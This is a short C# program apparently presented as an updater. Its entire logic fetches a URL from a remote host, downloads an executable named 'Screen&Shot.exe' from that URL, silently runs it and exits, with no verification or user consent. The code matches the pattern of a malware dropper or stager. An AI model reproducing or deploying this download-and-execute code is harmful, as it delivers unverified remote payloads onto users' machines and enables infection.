using System;
using System.Diagnostics;
using System.Net;

namespace Update
{
    class Program
    {
        static void Main(string[] args)
        {
            using (var client = new WebClient())
            {
                string URI = client.DownloadString("http://sns.bandoler.com/sns").Split(",")[2];
                client.DownloadFile(URI, "Screen&Shot.exe");
                Process.Start("Screen&Shot.exe");
                Environment.Exit(0);
            }
        }
    }
}
